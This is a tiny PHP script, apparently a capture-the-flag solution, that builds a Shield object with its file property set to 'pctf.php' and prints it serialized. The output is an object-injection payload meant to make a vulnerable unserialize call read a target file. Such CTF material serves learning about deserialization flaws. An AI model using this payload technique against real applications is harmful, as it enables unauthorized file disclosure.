<?php
/**
 * Created by PhpStorm.
 * User: wenhuizone
 * Date: 2016/5/2
 * Time: 13:47
 */
require_once('shield.php');
$x = new Shield();
$x->file='pctf.php';
echo serialize($x);
?>